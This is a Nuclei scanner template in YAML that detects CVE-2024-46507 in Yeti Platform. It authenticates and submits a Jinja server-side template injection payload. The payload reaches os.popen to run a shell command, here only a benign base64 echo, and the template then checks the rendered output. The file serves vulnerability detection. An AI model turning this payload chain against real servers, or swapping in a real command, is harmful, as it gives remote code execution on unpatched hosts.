http:
- matchers:
  - internal: true
    part: body
    type: word
    words:
    - access_token
  raw:
  - 'POST /api/v2/auth/token HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryodI9qNm7xBZLCq9n


    ------WebKitFormBoundaryodI9qNm7xBZLCq9n

    Content-Disposition: form-data; name="username"


    {{username}}

    ------WebKitFormBoundaryodI9qNm7xBZLCq9n

    Content-Disposition: form-data; name="password"


    {{password}}

    ------WebKitFormBoundaryodI9qNm7xBZLCq9n--

    '
- extractors:
  - internal: true
    json:
    - .id
    name: template_id
    part: body
    type: json
  raw:
  - 'POST /api/v2/templates/ HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"template":{"name":"AA","template":"value,tags\n{% for obj in data %}{{obj.value}},{{\";\".join(obj.tags.keys())}}\n{%
    endfor %}\n\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\"
    in x.__name__ %}{{x()._module.__builtins__[''__import__''](''os'').popen(\"echo
    Q1ZFLTIwMjQtNDY1MDcK | base64 -d\").read()}}{%endif%}{% endfor %}"}}

    '
  skip-variables-check: true
- extractors:
  - internal: true
    json:
    - .id
    name: observable_id
    part: body
    type: json
  raw:
  - 'POST /api/v2/observables/extended HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"observable":{"type":"ipv4","value":"1.{{randint(1,255)}}.{{randint(1,255)}}.{{randint(1,255)}}"}}

    '
- matchers:
  - condition: and
    dsl:
    - contains(body, "CVE-2024-46507")
    - contains(content_type, "text/plain")
    - status_code == 200
    type: dsl
  raw:
  - 'POST /api/v2/templates/render HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"template_id":"{{template_id}}","observable_ids":["{{observable_id}}"],"search_query":""}

    '
id: CVE-2024-46507
info:
  author: iamnoooob,rootxharsh,pdresearch
  description: 'The Yeti Platform < 2.1.12 contains a Server-Side Template Injection
    (SSTI) vulnerability that can lead to Remote Code Execution (RCE) when exploited
    by an authenticated user. Attackers with valid credentials can inject malicious
    template expressions, which the server evaluates, allowing arbitrary command execution.

    '
  impact: 'Successful exploitation enables an attacker to execute arbitrary system
    commands, potentially leading to full server compromise.

    '
  metadata:
    max-request: 4
    shodan-query: html:"Yeti</title>"
    verified: true
  name: Yeti Platform < 2.1.12 - Server-Side Template Injection to RCE
  reference:
  - https://rhinosecuritylabs.com/research/cve-2024-46507-yeti-server-side-template-injection-ssti/
  remediation: 'Upgrade to Yeti Platform 2.1.12 or later to mitigate this vulnerability.

    '
  severity: high
  tags: cve,cve2024,yeti,platform,ssti,rce,intrusive,vkev,vuln
variables:
  password: '{{password}}'
  username: '{{username}}'
